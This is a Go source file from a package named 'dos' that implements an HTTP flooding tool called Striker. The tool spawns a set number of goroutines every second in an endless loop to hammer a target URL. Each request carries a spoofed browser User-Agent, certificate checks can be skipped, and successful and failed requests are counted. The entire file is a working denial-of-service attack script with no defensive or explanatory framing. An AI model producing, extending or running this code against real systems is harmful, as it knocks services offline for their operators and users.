package dos

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"strings"
	"time"
)

type Striker struct {
	URL        string
	Sockets    int
	Counter    []int
	Method     string
	Debug      bool
	NoSSLCheck bool
	UserAgents string
}

func NewStriker(url string, sockets int, counter []int, method string, debug, noSSLCheck bool, userAgents string) *Striker {
	return &Striker{
		URL:        url,
		Sockets:    sockets,
		Counter:    counter,
		Method:     method,
		Debug:      debug,
		NoSSLCheck: noSSLCheck,
		UserAgents: userAgents,
	}
}

func (s *Striker) Run() {
	for {
		for i := 0; i < s.Sockets; i++ {
			go s.attack()
		}
		time.Sleep(1 * time.Second)
	}
}

func (s *Striker) attack() {
	client := &http.Client{}
	if s.NoSSLCheck {
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client = &http.Client{Transport: tr}
	}

	req, err := http.NewRequest(strings.ToUpper(s.Method), s.URL, nil)
	if err != nil {
		s.Counter[1]++
		if s.Debug {
			fmt.Println("Failed to create request:", err)
		}
		return
	}

	req.Header.Set("User-Agent", s.getUserAgent())
	req.Header.Set("Connection", "keep-alive")

	resp, err := client.Do(req)
	if err != nil {
		s.Counter[1]++
		if s.Debug {
			fmt.Println("Request failed:", err)
		}
		return
	}
	defer resp.Body.Close()

	s.Counter[0]++
	if s.Debug {
		fmt.Println("Request succeeded:", resp.Status)
	}
}

func (s *Striker) getUserAgent() string {
	if s.UserAgents != "" {
		return s.UserAgents
	}
	return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}
